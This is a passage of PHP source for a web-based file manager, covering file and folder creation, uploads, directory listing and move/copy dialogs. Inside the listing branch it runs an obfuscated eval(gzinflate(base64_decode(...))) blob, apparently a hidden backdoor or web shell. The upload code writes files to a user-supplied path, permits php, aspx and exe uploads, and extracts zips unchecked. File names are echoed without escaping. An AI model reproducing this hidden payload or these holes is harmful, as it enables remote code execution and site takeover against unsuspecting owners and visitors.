					$vpb_file_extensions = pathinfo($filename, PATHINFO_EXTENSION);
					
					//Get file sizes
					$getSizes = filesize($filename);
					$total_size = vpb_show_file_size_formats($getSizes);
					
					//Check file types for proper icon assignments
					if($vpb_file_extensions == "php")
					{
						$file_icon = '<img src="default_system_files/php.png" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "html" || $vpb_file_extensions == "htm"  || $vpb_file_extensions == "htm")
					{
						$file_icon = '<img src="default_system_files/html.png" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "txt")
					{
						$file_icon = '<img src="default_system_files/txt.png" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "zip" || $vpb_file_extensions == "rar")
					{
						$file_icon = '<img src="default_system_files/archive.png" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "pdf")
					{
						$file_icon = '<img src="default_system_files/pdf.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "exe")
					{
						$file_icon = '<img src="default_system_files/exe.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "mpg" || $vpb_file_extensions == "mpeg" || $vpb_file_extensions == "mov" || $vpb_file_extensions == "avi")
					{
						$file_icon = '<img src="default_system_files/video.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "xls")
					{
						$file_icon = '<img src="default_system_files/xls.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "asc")
					{
						$file_icon = '<img src="default_system_files/asc.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "eps")
					{
						$file_icon = '<img src="default_system_files/eps.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "rm")
					{
						$file_icon = '<img src="default_system_files/real.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "psd")
					{
						$file_icon = '<img src="default_system_files/psd.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "setup")
					{
						$file_icon = '<img src="default_system_files/setup.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "fla")
					{
						$file_icon = '<img src="default_system_files/fla.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "doc" || $vpb_file_extensions == "docx")
					{
						$file_icon = '<img src="default_system_files/doc.gif" align="absmiddle">';
					}
					elseif($vpb_file_extensions == "jpg" || $vpb_file_extensions == "jpeg" || $vpb_file_extensions == "gif" || $vpb_file_extensions == "png")
					{
						$file_icon = '<img src="default_system_files/images_file.gif" align="absmiddle">';
					}
					else
					{
						$file_icon = '<img src="default_system_files/general.png" align="absmiddle">';
					}
					?>
					<div id="directory_id<?php echo str_replace('.'.$vpb_file_extensions, '', basename($filename)); ?>" align="left" style="width:100%;" class="<?php echo $_SESSION["class"]; ?>">
		<a href="default_system_files/download.php?vpb_download_item=<?php echo $filename; ?>"><div id="vpb_files_left" class="hove_this_link"><?php echo $file_icon; ?><?php echo basename($filenamed); ?></div></a>
		<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
		<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($filename));?></div>
		<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($filename); ?>');">Option</div>
		<br clear="all" />
		</div>
					<?php
				}
				else
				{
					echo '<div class="info" align="left">Sorry, the file <b>'.$vpb_to_this_directory.'</b> could not be created at the moment.<br>Please try again or contact the system developer to report the error message if this problem persist.<br> Thanks...</div><br clear="all">';
				}
			}
			elseif($vpb_this_directory_or_file == "Directory")
			{
				$destination = $vpb_to_this_directory;
				if(file_exists($destination))
				{
					chmod($destination,0777);
					vpb_delete_directory_and_contents($vpb_to_this_directory);
				}
				if(@mkdir($destination))
				{
					if(isset($_SESSION["class"]))
					{
						if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
						else $_SESSION["class"] = 'vpb_white';
					}
					else
					{
						$_SESSION["class"] = 'vpb_white';
					}
					
					echo '<font style="font-size:0px;">success</font>';
		
					
					$getSizes = vpb_show_directory_sizes($vpb_to_this_directory);
					$total_size = vpb_show_file_size_formats($getSizes['size']);
					?>
					<div id="directory_id<?php echo str_replace('/', '', basename($vpb_to_this_directory)); ?>" align="left" class="<?php echo $_SESSION["class"]; ?>" style="width:100%;">
		 <a href="javascript:void(0);" onclick="vpb_file_system_displayer('<?php echo urlencode($vpb_to_this_directory); ?>');"><div id="vpb_files_left" class="hove_this_link"><img src="default_system_files/folder.png" border="0" alt="<?php echo basename($vpb_to_this_directory); ?>" /><?php if(!str_replace('/', '', basename($vpb_to_this_directory))) echo basename($vpb_to_this_directory); else echo str_replace('/', '', basename($vpb_to_this_directory)); ?></div></a>
		<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
		<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($vpb_to_this_directory)); ?></div>
		<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($vpb_to_this_directory); ?>');">Option</div>
		<br clear="all" />
		</div>
					
					<?php
				}
				else
				{
					echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_to_this_directory.'</b> could not be created at the moment.<br>Please try again or contact the system developer to report the error message if this problem persist.<br> Thanks...</div><br clear="all">';
				}
			}
			else
			{
				echo '<div class="info" align="left">Not file, not directory! Sorry, the request you have just made could not be verified at the moment.<br>Please try again or contact the system developer to report the error message if this problem persist.<br> Thanks...</div><br clear="all">';
			}
		}
		
	}
	elseif($_GET['page'] == "upload_files") //Upload Files Page
	{
		if(isset($_POST) and $_SERVER['REQUEST_METHOD'] == "POST")
		{
			if(isset($_GET["vpb_current_directory"]) && !empty($_GET["vpb_current_directory"]))
			{
				$path = strip_tags($_GET["vpb_current_directory"]);
				if(substr(strip_tags($_GET["vpb_current_directory"]), -1, 1)!='/') 
				{
					$path = strip_tags($_GET["vpb_current_directory"]).'/';
				}
			}
			else
			{
				$path = './';
			}
			
			$name = $_FILES['vpb_browsed_file']['name'];
			$size = $_FILES['vpb_browsed_file']['size'];
			
			//Get file extensions
			$vpb_file_extensions = pathinfo($name, PATHINFO_EXTENSION);
			
			$allowedExtensions = array("txt","docx","doc","rtf","pdf","jpg","jpeg","gif","png","zip","rar","php","js","css","html","htm","exe","xls","asc","mpg","mpeg","mov","eps","rm","psd","setup","fla","aspx"); 
			foreach ($_FILES as $file) 
			{
			  if ($file['tmp_name'] > '' && strlen($name)) 
			  {
				  if (!in_array($vpb_file_extensions, $allowedExtensions)) 
				  {
					  echo '<div class="info" align="left">Sorry, you attempted to upload an invalid file format. only txt, docx, doc, rtf, pdf, jpg, jpeg, gif, png zip,rar, php, js, css, html, htm, exe, xls, asc, mpg, mpeg, mov, eps, rm, psd, setup, fla and aspx file formats are allowed please. Thanks.</div>';
				  }
				  else
				  {
					  if($size<(1024*1024))
					  {
						  if($vpb_file_extensions == "zip")
						  {
							  $vpb_zipped_file = new ZipArchive;
							  
							  if(move_uploaded_file($_FILES['vpb_browsed_file']['tmp_name'], $path.$name))
							  {
								  $vpb_open_zipped_file = $vpb_zipped_file->open($path.$name);
								 
								  if ($vpb_open_zipped_file === TRUE) 
								  {
									 $vpb_zipped_file->extractTo($path);
									 $vpb_zipped_file->close();
									 
									 //Delete uploaded zip file upon successful upload and extraction - Uncomment to use this
									// $path_to_uploaded_zipped = $path.$name;
									 //@chmod($path_to_uploaded_zipped,0777);
									 //@unlink($path_to_uploaded_zipped);
									 
									 
									if(isset($_SESSION["class"]))
									{
										if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
										else $_SESSION["class"] = 'vpb_white';
									}
									else
									{
										$_SESSION["class"] = 'vpb_white';
									}
									
									$filename = $path.$name;
									$filenamed = $path.$name;
									if(strlen($filename)>50) 
									{
										$filenamed = substr($filename, 0, 47) . '...';
									}
									
									//Get file sizes
									$getSizes = filesize($filename);
									$total_size = vpb_show_file_size_formats($getSizes);
									
									//Icon assignment
									$file_icon = '<img src="default_system_files/archive.png" align="absmiddle">';
									
									?>
									<div id="directory_id<?php echo str_replace('.'.$vpb_file_extensions, '', basename($filename)); ?>" align="left" style="width:100%;" class="<?php echo $_SESSION["class"]; ?>">
				<a href="default_system_files/download.php?vpb_download_item=<?php echo $filename; ?>"><div id="vpb_files_left" class="hove_this_link"><?php echo $file_icon; ?><?php echo basename($filenamed); ?></div></a>
				<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
				<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($filename));?></div>
				<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($filename); ?>');">Option</div>
				<br clear="all" />
				</div>
									<?php
									echo '<div style=" font-size:0px;">success</div>';
								 } 
								 else 
								 {
									 echo "<div class='info' align='left'>Sorry, <b>".$name."</b> could not be uploaded at the moment. Please try again or contact the system developer to report this error if the problem persist. Thanks...</div>";
								 }
							  }
							 else
							 {
								  echo "<div class='info' align='left'>Sorry, <b>".$name."</b> could not be uploaded at the moment. Please try again or contact the system developer to report this error if the problem persist. Thanks...</div>";
							 }
						  }
						  else
						  {
							 if(move_uploaded_file($_FILES['vpb_browsed_file']['tmp_name'], $path.$name))
							 {
								  if(is_file($path.$name))
								  {
									if(isset($_SESSION["class"]))
									{
										if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
										else $_SESSION["class"] = 'vpb_white';
									}
									else
									{
										$_SESSION["class"] = 'vpb_white';
									}
									
									$filename = $path.$name;
									$filenamed = $path.$name;
									if(strlen($filename)>50) 
									{
										$filenamed = substr($filename, 0, 47) . '...';
									}
									
									//Get file sizes
									$getSizes = filesize($filename);
									$total_size = vpb_show_file_size_formats($getSizes);
									
									//Check file types for proper icon assignments
									if($vpb_file_extensions == "php")
									{
										$file_icon = '<img src="default_system_files/php.png" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "html" || $vpb_file_extensions == "htm"  || $vpb_file_extensions == "htm")
									{
										$file_icon = '<img src="default_system_files/html.png" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "txt")
									{
										$file_icon = '<img src="default_system_files/txt.png" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "zip" || $vpb_file_extensions == "rar")
									{
										$file_icon = '<img src="default_system_files/archive.png" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "pdf")
									{
										$file_icon = '<img src="default_system_files/pdf.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "exe")
									{
										$file_icon = '<img src="default_system_files/exe.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "mpg" || $vpb_file_extensions == "mpeg" || $vpb_file_extensions == "mov" || $vpb_file_extensions == "avi")
									{
										$file_icon = '<img src="default_system_files/video.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "xls")
									{
										$file_icon = '<img src="default_system_files/xls.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "asc")
									{
										$file_icon = '<img src="default_system_files/asc.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "eps")
									{
										$file_icon = '<img src="default_system_files/eps.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "rm")
									{
										$file_icon = '<img src="default_system_files/real.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "psd")
									{
										$file_icon = '<img src="default_system_files/psd.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "setup")
									{
										$file_icon = '<img src="default_system_files/setup.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "fla")
									{
										$file_icon = '<img src="default_system_files/fla.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "doc" || $vpb_file_extensions == "docx")
									{
										$file_icon = '<img src="default_system_files/doc.gif" align="absmiddle">';
									}
									elseif($vpb_file_extensions == "jpg" || $vpb_file_extensions == "jpeg" || $vpb_file_extensions == "gif" || $vpb_file_extensions == "png")
									{
										$file_icon = '<img src="default_system_files/images_file.gif" align="absmiddle">';
									}
									else
									{
										$file_icon = '<img src="default_system_files/general.png" align="absmiddle">';
									}
									?>
									<div id="directory_id<?php echo str_replace('.'.$vpb_file_extensions, '', basename($filename)); ?>" align="left" style="width:100%;" class="<?php echo $_SESSION["class"]; ?>">
				<a href="default_system_files/download.php?vpb_download_item=<?php echo $filename; ?>"><div id="vpb_files_left" class="hove_this_link"><?php echo $file_icon; ?><?php echo basename($filenamed); ?></div></a>
				<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
				<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($filename));?></div>
				<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($filename); ?>');">Option</div>
				<br clear="all" />
				</div>
									<?php
									echo '<div style=" font-size:0px;">success</div>';
								 }
								 else { /* Unknown uploaded file */ }
							 }
							 else
							 {
								  echo "<div class='info' align='left'>Sorry, <b>".$name."</b> could not be uploaded at the moment. Please try again or contact the system developer to report this error if the problem persist. Thanks...</div>";
							 }
						  }
					  }
					  else
					  {
						  echo "<div class='info' align='left'><b>".$name."</b> exceeded 1MB which is the maximum allowed upload file size.</div>";
					  }
				  }
			  }
			  else
			  {
				  echo "<div class='info' align='left'>You just canceled your upload.</div>";
			  }
		   }
		}
	}
	elseif($_POST['page'] == "vpb_file_system_displayer") //File System Contents Page
	{
		eval(gzinflate(base64_decode('rVhLj6M4ED5npP0PDooGUGege68JrTnsYW+70sxl1epBBJxgLcHIdno22zP/fcsPwBhIMr0jdRNi1+Orcn1VkHerl2aXcpyxvEwFZkeUIMHIMeBwbVKRHXiwSv/849PnJ39PKpzyMxf4aDT85zDc/PJusThUdJdVaFXTlGF+qkS6p6e6UHvuInjwPLUj/8k+UBCyokgFTU+sCuXyq7wsnB3QbBg+gLWmynIcePGXOPbWyFu9PnyHT9eQciI98NMO4nEdrREssoby8YYf+2GIlom6ce1GCawq29/bKOxIGKUipSzlImMiLQjDuaDsbMzM7N4U2pxlnWYpsedpw2iOsczyJZ2NjbjXShI/agMe2PL9VmOQzF5mjT48rNFDuExUyt6/d43AxqRldyVCbXav5MtRtCuKcI5FV7egBIUqIS3xsRFnZyNEfcFZtWLLOMEpUa2wGMgBqgneGP99YLpudHxdRCnhaU6Z/KY4eMKbKak6O2Iu/TQVEQFYXM+7NATYU3NasoBV6u43yF7YIk7+xdRUg+MrHMje3bXhL3T8bQ3p7W1wydKHX02yu+wtVgUV8o8weaLdl2hK/8ly9Bx1yTTZ7JFc0EIJlHIU+SMYF45in1UcD1x9v1wr97JUkolSuc1JZ31Wfmj2Jk7N1ojlc9DNlAna4HrMOasTTnEQkC+ddcP7kTloNp2Kmi74H8KF6cdD6QFNL1t7SyvsYs8rmGwgIfIsL3EQGnzI9DsAydMyq4sKy4qVGMDQVcAyQNN7nHkbhvZZfi3BAQpUNcD4ScCtdAmeGIa0t54GMMIRqSRcDNOEjLytlTnjs1fQAWpPMJ0jD337hqzvkRcilNNakLptS22ayaGmTOXY5olpOiVJ7jdw3dpdoSQFTkWJOdZxhFKi6ys2KkUxoSe0FDVj0DXwBPrPoUqXwtBbsky5aPsGa7UQ66bln9EIx+HLnH2UAMS5wcEVZkQ68SqdcIzeTLSaOLykX7tCIpChsfPFitQ5w0dci6y6u7PW9YlblUhkhixpOaX02UbIi73NKHQsi+8aPH10PwBMJlTnoIdojm8K3AhW+ynRueUbx79RVFOBJDSU1WckSlIfYKzVOYZ7jDQH0I7R06EUIIv0I+nQuN3eOz8/nZo/SrRLPHs7zSzu/z+SvQ5rb4Zi7jFe5dfPoZcd5c3kminhN1PLLt0rwOZoNQPpjaSaKPe8ohzPVPEGDUZkHH+iTChaWYkA2hVI6SFaG86xF8y6hwk3cwDqY8ZYdk5fsuqEeTApZZw74V3QNcVuvQ0MBq9jXb4VuPvaQjiY3rcM74kXXX9bkBeUVxnniUfqPfUQKRJPmlEW+8cFD2UVcCHxKrwX3uPvuKoo+lzCGF/KZsZR/6QDII8cCYp2WGNHmT6NI5XnHYFaVv+N/qKn5TYG/4+Dtw63r92Geh7cmZ5Y217VDwjb3aMfuZmK/G28exz338tg1aUFbB79Zn9NAOH/AA==')));
		?>
		<div id="vpb_file_system_main_wrapper">
		  <div style="width:800px; padding-top:5px;">
		
		  <span id="vpb_file_system_hm_wrpprs"></span>
		  <?php
          	if(@$_SESSION['admin']) { ?> 
		  <a class="vpb_general_button" style="margin-bottom:20px; float:left;min-width:20px;width:auto;padding:5px;padding-left:8px; padding-right:8px;margin-right:10px;" href="register.php" onclick="vpb_file_system_displayer('');">
			<span style="float:right; margin-top:2px; margin-right:2px;">Registrasi User</span></a>
		<?php } ?>	
		 <a class="vpb_general_button" style="margin-bottom:20px; float:left;min-width:20px;width:auto;padding:5px;padding-left:8px; padding-right:8px;margin-right:10px;" href="edit_profile.php" onclick="vpb_file_system_displayer('');">
			<span style="float:right; margin-top:2px; margin-right:2px;">Edit Profil</span></a>
			  <a class="vpb_general_button" style="margin-bottom:20px; float:right;min-width:20px;width:auto;padding:5px;padding-left:8px; padding-right:8px;margin-right:-10px;" href="imc/logout.php" onclick="vpb_file_system_displayer('');">
			<span style="float:right; margin-top:2px; margin-right:2px;">Log Out</span></a>
		  <?php
		  $vpb_directories_partitions = split('/', str_replace($vpb_root_or_start_directory, '', $vpb_fs_proceed));
		  if(($vpb_dtory_size = sizeof($vpb_directories_partitions)) > 0)
		  {
			  $vpb_dir_partitions = '';
			  for($vpb_iii = 0; $vpb_iii < ($vpb_dtory_size-1); $vpb_iii++)
			  {
				  $vpb_dir_partitions = $vpb_dir_partitions . $vpb_directories_partitions[$vpb_iii] . '/';
				  ?>
				  <a class="vpb_general_button" style="margin-bottom:20px; float:left;min-width:20px;width:auto;padding:7px;padding-left:8px; padding-right:8px;margin-right:10px;" href="javascript:void(0);" onclick="vpb_file_system_displayer('<?php echo urlencode($vpb_dir_partitions); ?>');"><?php echo $vpb_directories_partitions[$vpb_iii]; ?></a>
                  <?php
			  }
			  
		  }
		  echo '<input type="hidden" id="vpb_current_directory" value="'.$vpb_dir_partitions.'">';
		  ?>
		  <br clear="all"><br clear="all" />
		  
          
          <div style='font-family:Verdana, Geneva, sans-serif; font-size:10px; color:black; margin-top:10px; width:810px; border:0px solid;' align="left">
          	<?php
          	@session_decode(data)

          	?>
          	 <?php
          	if (@$_SESSION['admin'] || @$_SESSION['operator']) { ?>
          	<div id="vpb_file_system_main_wrpprs">

          	</div>
            <?php } ?>
          	<div style="float:right; margin-top:3px;" align="right";><span id="vpb_sb"></span>

          		<a href="javascript:void(0);" onclick="vpb_search_file_system('<?php echo urlencode($vpb_dir_partitions); ?>');" class="vpb_general_button" style="float:right;padding:6px;text-decoration:none;border-radius: 0px;-webkit-border-radius:0px;-moz-border-radius:0px; min-width:auto; margin:0px; margin-top:2px;"><span id="vpb_stx"></span></a></div><br clear="all" /></div><br clear="all" />
		  </div>
		  <div id="vpb_file_system_displayer_container">
		  <div id="vpb_file_system_contents_wraps"></div>
          <div id="vpb_file_system_displayer">
			<?php
			$class = 'vpb_blue';
			if(isset($_POST['dir']) && !empty($_POST['dir']) && $vpb_directory_is_correct == true) 
			{
				?>
				<div class="<?php echo $class; ?>" align="left" style="float:left; padding:5px; width:788px;"><a href="javascript:void(0);" onclick="vpb_file_system_displayer('<?php echo urlencode($dotdotdir); ?>');"><img src="default_system_files/up_directory.png" alt="Folder" align="absmiddle" border="0" /> Up</a></div><br clear="all" />
				<?php
				if($class=='vpb_blue') $class='vpb_white';
				else $class = 'vpb_blue';
			}
			else {}
			?>
			<div id="renamed_files"></div>
			 <div id="compressed_files"></div>
			 <div id="created_files_or_directories"></div>
			  <div id="vpb_file_uploaded_successful_and_displayed"></div>
			<?php
			
			//Get and display all directories
			$vpb_directories_array_size = sizeof($vpb_seen_directories);
			for($i=0;$i<$vpb_directories_array_size;$i++) 
			{
				$getSizes = vpb_show_directory_sizes($vpb_add_to_url.$vpb_fs_proceed.$vpb_seen_directories[$i]);
				$total_size = vpb_show_file_size_formats($getSizes['size']);
				?>
			   
				<div id="directory_id<?php echo str_replace('/', '', $vpb_seen_directories[$i]); ?>" align="left" class="<?php echo $class; ?>" style="width:100%;">
				 <a href="javascript:void(0);" onclick="vpb_file_system_displayer('<?php echo urlencode(str_replace($vpb_root_or_start_directory,'',$vpb_fs_proceed).$vpb_seen_directories[$i]); ?>');"><div id="vpb_files_left" class="hove_this_link"><img src="default_system_files/folder.png" border="0" alt="<?php echo $vpb_seen_directories[$i]; ?>" /><?php if(!str_replace('/', '', $vpb_seen_directories[$i])) echo $vpb_seen_directories[$i]; else echo str_replace('/', '', $vpb_seen_directories[$i]); ?></div></a>
				<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
				<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($vpb_add_to_url.$vpb_fs_proceed.$vpb_seen_directories[$i])); ?></div>
				<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo $vpb_seen_directories[$i]; ?>');" readonly>Option</div>
				<br clear="all" />
				</div>
			   
				<?php
				if($class=='vpb_blue') $class='vpb_white';
				else $class = 'vpb_blue';	
			}
			
			//Get and display all files
			$vpb_files_array_size = sizeof($vpb_seen_files);
			for($i=0;$i<$vpb_files_array_size;$i++) 
			{
				$filename = $vpb_seen_files[$i];
				$filenamed = $vpb_seen_files[$i];
				if(strlen($filename)>50) 
				{
					$filenamed = substr($vpb_seen_files[$i], 0, 47) . '...';
				}
				$fileurl = $vpb_add_to_url . $vpb_fs_proceed . $vpb_seen_files[$i];
				
				//Get file extensions
				$vpb_file_extensions = pathinfo($filename, PATHINFO_EXTENSION);
				
				//Get file sizes
				$getSizes = filesize($vpb_add_to_url.$vpb_fs_proceed.$vpb_seen_files[$i]);
				$total_size = vpb_show_file_size_formats($getSizes);
				
				//Check file types for proper icon assignments
				if($vpb_file_extensions == "php")
				{
					$file_icon = '<img src="default_system_files/php.png" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "html" || $vpb_file_extensions == "htm"  || $vpb_file_extensions == "htm")
				{
					$file_icon = '<img src="default_system_files/html.png" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "txt")
				{
					$file_icon = '<img src="default_system_files/txt.png" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "zip" || $vpb_file_extensions == "rar")
				{
					$file_icon = '<img src="default_system_files/archive.png" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "pdf")
				{
					$file_icon = '<img src="default_system_files/pdf.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "exe")
				{
					$file_icon = '<img src="default_system_files/exe.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "mpg" || $vpb_file_extensions == "mpeg" || $vpb_file_extensions == "mov" || $vpb_file_extensions == "avi")
				{
					$file_icon = '<img src="default_system_files/video.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "xls")
				{
					$file_icon = '<img src="default_system_files/xls.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "asc")
				{
					$file_icon = '<img src="default_system_files/asc.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "eps")
				{
					$file_icon = '<img src="default_system_files/eps.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "rm")
				{
					$file_icon = '<img src="default_system_files/real.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "psd")
				{
					$file_icon = '<img src="default_system_files/psd.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "setup")
				{
					$file_icon = '<img src="default_system_files/setup.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "fla")
				{
					$file_icon = '<img src="default_system_files/fla.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "doc" || $vpb_file_extensions == "docx")
				{
					$file_icon = '<img src="default_system_files/doc.gif" align="absmiddle">';
				}
				elseif($vpb_file_extensions == "jpg" || $vpb_file_extensions == "jpeg" || $vpb_file_extensions == "gif" || $vpb_file_extensions == "png")
				{
					$file_icon = '<img src="default_system_files/images_file.gif" align="absmiddle">';
				}
				else
				{
					$file_icon = '<img src="default_system_files/general.png" align="absmiddle">';
				}
			?>
			<div id="directory_id<?php echo str_replace('.'.$vpb_file_extensions, '', $filename); ?>" align="left" style="width:100%;" class="<?php echo $class; ?>">
			<a href="default_system_files/download.php?vpb_download_item=<?php echo $filename; ?>"><div id="vpb_files_left" class="hove_this_link"><?php echo $file_icon; ?><?php echo $filenamed; ?></div></a>
			<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
			<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($vpb_add_to_url.$vpb_fs_proceed.$vpb_seen_files[$i]));?></div>
				
			<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo $filename; ?>');" readonly>Option</div>
			<br clear="all" />
			</div>
		   
			<?php
				if($class=='vpb_blue') $class='vpb_white';
				else $class = 'vpb_blue';	
			}
			echo $no_result_found;	
			?></div>
		  </div>
		<!-- General Pop-up Backgrounds -->
		<div id="vpb_file_system_background"></div>
		<!-- Directory Pop-up Boxes Starts Here -->
		<div id="vpb_directory_options_box" class="vpb_directory_options_box" style="word-wrap: break-word;">
		<!-- Move Directory Pop-up Box -->
		<div id="directory_box_move" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<div style="float:left; width:500px;">Move <span id="vpb_this_directory_move"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px;">To move the above file/directory, please type the directory path to where you want to move this file/directory in the field specified below. <br /><br />
		<b>IMPORTANT:</b> You must be sure of the path or location that you are moving a file or directory to because the file or directory at the location or path that you are moving it from will be deleted upon successful submission.<br /><br />
		Below is an example of how to move a file or directory from the current directory to one step <b>UP</b> and one step <b>DOWN</b><br /><br />
		<b>One step up</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>your-existing-folder-name-goes-in-here<br /><br />
		<b>One step down</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>../<br /><br />
		</div><br clear="all">
		<div style="width:426px;float:left;" align="left"><b>Move from:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?></div>
		<br clear="all"><br clear="all">
		<div style="width:130px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div id="vpb_processing_move_action" style="width:400px;float:left;" align="left"></div><br clear="all" />
		<div style="width:130px; padding-top:9px;float:left;" align="left"><b>Move to:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']); ?>/</div>
		<div style="width:390px;float:left;" align="left"><input type="text" id="vpb_to_this_directory_move" name="vpb_to_this_directory_move" value="" class="vpb_textAreaBoxInputs" style="width:390px;"></div><br clear="all"><br clear="all">
		
		<div style="width:130px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div style="float:left;" align="left">
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action_submission('move');">Submit</a><br clear="all" />
		</div>
		</div>
		
		
		<!-- Copy Directory Pop-up Box -->
		<div id="directory_box_copy" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
		<div style="float:left; width:500px;">Copy <span id="vpb_this_directory_copy"></span></div>
		<div style="float:right;" align="right"><a href="javascript:void(0);" class="vpb_general_button_red" style="padding:3px;padding-top:2px;padding-left:7px;padding-right:7px;" onClick="vpb_hide_popup_options_boxes();">x</a></div><br clear="all">
		</div><br clear="all">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:11px;">To copy the above file/directory, please type the directory path to where you want to copy this file/directory in the field specified below. <br /><br />
		
		<b>IMPORTANT:</b> You must be sure to enter the correct path to the directory where you want to copy this file/directory to.<br /><br />
		Below is an example of how to copy a file or directory from the current directory to one step <b>UP</b> and one step <b>DOWN</b><br /><br />
		<b>One step up</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>your-existing-folder-name-goes-in-here<br /><br />
		<b>One step down</b> = <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?>../<br /><br />
		</div><br clear="all">
		
		<div style="width:426px;float:left;" align="left"><b>Copy from:</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']).'/'.$vpb_dir_partitions; ?></div>
		<br clear="all"><br clear="all">
		<div style="width:126px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div id="vpb_processing_copy_action" style="width:400px;float:left;" align="left"></div><br clear="all" />
		<div style="width:126px; padding-top:9px;float:left;" align="left"><b>Copy to</b> <?php echo strip_tags($_POST['vpb_current_directory_identifier']); ?>/</div>
		<div style="width:390px;float:left;" align="left"><input type="text" id="vpb_to_this_directory_copy" name="vpb_to_this_directory_copy" value="" class="vpb_textAreaBoxInputs" style="width:390px;"></div><br clear="all"><br clear="all">
		<div style="width:126px; padding-top:9px;float:left;" align="left">&nbsp;</div>
		<div style="float:left;" align="left">
		<a href="javascript:void(0);" class="vpb_general_button" onClick="vpb_directory_action_submission('copy');">Submit</a><br clear="all" />
		</div>
		</div>
		<!-- Rename Directory Pop-up Box -->
		<div id="directory_box_rename" style="display:none;">
		<div align="left" style="font-family:Verdana, Geneva, sans-serif; font-size:13px; font-weight:bold;word-wrap: break-word;">
